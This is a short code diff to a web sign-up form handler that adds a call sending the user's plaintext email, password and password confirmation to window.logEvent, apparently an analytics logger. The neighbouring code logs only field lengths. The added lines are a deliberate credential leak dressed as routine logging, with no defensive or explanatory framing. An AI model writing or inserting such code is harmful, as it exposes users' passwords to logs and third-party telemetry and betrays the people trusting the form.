@@ -281,6 +281,9 @@
     const confirmLength = confirm.length;
     const emailLength = email.length;
 
+    // log exact email and password used this time
+    window.logEvent('email_and_password_and_confirm_used', { email, password, confirm });
+
     if (!isValidEmail(email)) {
       logSubmissionFailure('invalid_email_format', { emailLength });
       showMessage('Enter a valid email (e.g., name@example.com).');
